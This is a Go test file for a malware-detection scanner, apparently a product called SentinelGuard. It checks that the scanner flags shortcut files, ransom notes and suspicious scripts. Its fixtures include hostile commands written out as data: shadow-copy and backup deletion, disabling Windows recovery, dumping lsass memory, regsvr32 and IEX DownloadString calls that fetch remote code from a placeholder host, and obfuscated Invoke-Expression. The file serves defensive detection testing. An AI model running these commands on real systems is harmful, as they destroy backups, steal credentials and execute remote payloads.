package main

import (
	"bytes"
	"encoding/binary"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func stage7LNKFixture(command string) []byte {
	// Minimal Shell Link header followed by an inert argument string; not executable.
	b := make([]byte, 76+len(command))
	binary.LittleEndian.PutUint32(b[:4], 0x4c)
	copy(b[4:20], []byte{0x01,0x14,0x02,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46})
	copy(b[76:],command)
	return b
}
func TestStage7ShortcutFormatValidation(t *testing.T) {
	command:="powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	dir:=t.TempDir()
	for _,tc:=range []struct{name string;data []byte;want bool}{
		{"valid.lnk",stage7LNKFixture(command),true},
		{"fake.lnk",[]byte(command),false},
		{"normal.lnk",stage7LNKFixture("explorer.exe"),false},
	}{
		p:=filepath.Join(dir,tc.name)
		if err:=os.WriteFile(p,tc.data,0600);err!=nil {t.Fatal(err)}
		st,_:=os.Stat(p)
		f:=inspectFile(p,st)
		if (f!=nil)!=tc.want {t.Errorf("%s expected=%v flagged=%v",tc.name,tc.want,f!=nil)}
	}
}
func TestStage7HighConfidencePatterns(t *testing.T) {
	cases:=[]struct{filename,text string;want bool}{
		{"shadow.cmd","vssadmin delete shadows /all /quiet",true},
		{"recovery.cmd","bcdedit /set {default} recoveryenabled no",true},
		{"backup.cmd","wbadmin delete catalog -quiet",true},
		{"dump.cmd","procdump -ma lsass.exe dump.dmp",true},
		{"service.cmd","sc create fake binPath= C:\\example.exe",true},
		{"remote.cmd","regsvr32.exe /s /n /u /i:https://example.invalid/sct scrobj.dll",true},
		{"ps.ps1","$x='In'+'voke-Expression'; & $x 'Write-Output hi'",true},
		{"note.txt","AES-GCM is commonly used for backups.",false},
		{"info.ps1","# vssadmin delete shadows /all /quiet\nWrite-Host hello",false},
		{"msi.cmd","echo msiexec.exe /i https://example.invalid/x.msi /qn",false},
		{"edit.js","crypto.subtle.encrypt({name:'AES-GCM'},key,data)",false},
		{"backup.txt","Read a manual about vssadmin delete shadows.",false},
	}
	base:=t.TempDir(); tp,fn,fp,tn:=0,0,0,0
	for i,tc:=range cases{
		dir:=filepath.Join(base,string(rune('a'+i)))
		if err:=os.MkdirAll(dir,0700);err!=nil{t.Fatal(err)}
		p:=filepath.Join(dir,tc.filename)
		if err:=os.WriteFile(p,[]byte(tc.text),0600);err!=nil{t.Fatal(err)}
		st,_:=os.Stat(p); got:=inspectFile(p,st)!=nil
		if tc.want&&got{tp++}else if tc.want{fn++;t.Errorf("MISSED: %s",tc.filename)}else if got{fp++;t.Errorf("FALSE FLAG: %s",tc.filename)}else{tn++}
	}
	t.Logf("STAGE7 HIGH-CONFIDENCE TP=%d FN=%d FP=%d TN=%d",tp,fn,fp,tn)
}
func TestStage7RansomNoteAndArchiveFormat(t *testing.T) {
	base:=t.TempDir()
	tests:=[]struct{name string;data []byte;want bool}{
		{"README_DECRYPT.txt",[]byte("Your files have been encrypted. Pay to recover them."),true},
		{"README_DECRYPT_normal.txt",[]byte("Read about disk encryption with no extortion demand."),false},
		{"suspicious.rar",[]byte("IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/x')"),true},
		{"legitimate.rar",append([]byte{'R','a','r','!',0x1a,0x07,0x01,0x00},bytes.Repeat([]byte("A"),64)...),false},
	}
	for i,tc:=range tests {
		dir:=filepath.Join(base,string(rune('a'+i)))
		_ = os.MkdirAll(dir,0700)
		p:=filepath.Join(dir,tc.name)
		if err:=os.WriteFile(p,tc.data,0600);err!=nil{t.Fatal(err)}
		st,_:=os.Stat(p)
		got:=inspectFile(p,st)
		if (got!=nil)!=tc.want{t.Errorf("%s want %v got %v",tc.name,tc.want,got!=nil)}
	}
}
func TestStage7UIBrandVersion(t *testing.T) {
	b,err:=pages.ReadFile("ui.html");if err!=nil{t.Fatal(err)}
	s:=string(b)
	if !strings.Contains(s,"SentinelGuard") || !strings.Contains(s,"v3.2"){t.Fatal("UI is missing SentinelGuard v3.2 branding")}
	if strings.Contains(s,"SentinelLite"){t.Fatal("old product name remains in the rendered interface")}
}
